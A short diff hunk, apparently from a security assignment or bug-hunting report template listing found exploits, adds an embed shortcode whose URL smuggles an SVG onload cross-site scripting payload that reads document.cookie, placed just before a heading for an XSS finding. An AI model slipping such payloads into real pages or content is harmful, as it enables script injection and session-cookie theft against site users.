@@ -32,6 +32,8 @@ Summary for exploit 3:
    - Links to the source code, where possible
    - A screen cap
 
+[embed src='https://youtube.com/embed/12345\x3csvg onload=alert(document.cookie)\x3e'][/embed]
+
 Fourth exploit found: XSS (Cross Site Scripting)<br/>
 Summary for exploit 4:         
    - A small writeup indicating the steps you used to recreate
